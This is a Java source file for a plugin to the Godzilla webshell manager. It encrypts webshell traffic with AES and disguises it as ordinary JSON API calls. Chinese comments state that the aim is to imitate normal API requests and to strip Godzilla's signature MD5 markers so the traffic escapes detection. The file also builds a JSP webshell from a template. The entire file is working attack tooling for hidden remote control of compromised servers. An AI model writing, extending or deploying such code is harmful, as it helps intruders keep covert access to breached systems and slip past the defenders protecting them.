package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.UUID;

// 注册新插件，名称为 "JAVA_AES_JSON"
@CryptionAnnotation(
        Name = "JAVA_AES_JSON",
        payloadName = "JavaDynamicPayload"
)
public class JavaAesJson implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX(); // 获取处理过的 16 位密钥

        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(this.key.getBytes(), "AES"));

            // 初始化时设置 Content-Type 为 JSON，模拟正常 API
            this.shell.getHeaders().put("Content-Type", "application/json");

            // 测试连接
            byte[] payload = this.shell.getPayloadModule().getPayload();
            if (payload != null) {
                this.http.sendHttpResponse(payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            // 1. AES 加密
            byte[] encrypted = this.encodeCipher.doFinal(data);
            // 2. Base64 编码
            String b64Data = functions.base64EncodeToString(encrypted);
            
            // 3. [核心修改] 封装成 JSON 格式
            // 模拟一个 API 请求：{"action": "update", "token": "UUID", "payload": "..."}
            String jsonBody = String.format("{\"action\":\"api_sync\", \"token\":\"%s\", \"data\":\"%s\"}", 
                    UUID.randomUUID().toString(), b64Data);
            
            return jsonBody.getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            String respText = new String(data).trim();
            // 4. [核心修改] 解析 JSON 响应
            // 假设服务端返回：{"code": 200, "msg": "success", "result": "BASE64_ENCRYPTED_DATA"}
            // 这里为了简化代码，直接寻找 "result":"..." 的模式，你也可以引入 FastJson/Gson
            
            String token = "\"result\":\"";
            int start = respText.indexOf(token);
            if (start != -1) {
                start += token.length();
                int end = respText.indexOf("\"", start);
                if (end != -1) {
                    String b64Result = respText.substring(start, end);
                    return this.decodeCipher.doFinal(functions.base64Decode(b64Result));
                }
            }
            // 如果解析失败，尝试直接解密（兼容出错信息）
            return this.decodeCipher.doFinal(functions.base64Decode(respText));
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public boolean isSendRLData() {
        // [重点] 返回 false
        // 这一步彻底去除了 Godzilla 标志性的 MD5 前后缀特征
        return false; 
    }

  @Override
    public byte[] generate(String password, String secretKey) {
        try {
            // [修正] 读取专门的 JSON 模板文件
            java.io.InputStream inputStream = this.getClass().getResourceAsStream("template/shell_json.jsp");
            if (inputStream == null) {
                Log.error("Template 'shell_json.jsp' not found!");
                return null;
            }
            
            byte[] templateBytes = functions.readInputStream(inputStream);
            String template = new String(templateBytes);

            // 替换模板中的占位符
            template = template.replace("{secretKey}", secretKey);
            // 某些模板可能还需要替换 pass，虽然 json 模式主要靠 secretKey
            template = template.replace("{pass}", password); 

            return template.getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public boolean check() {
        return this.state;
    }
}
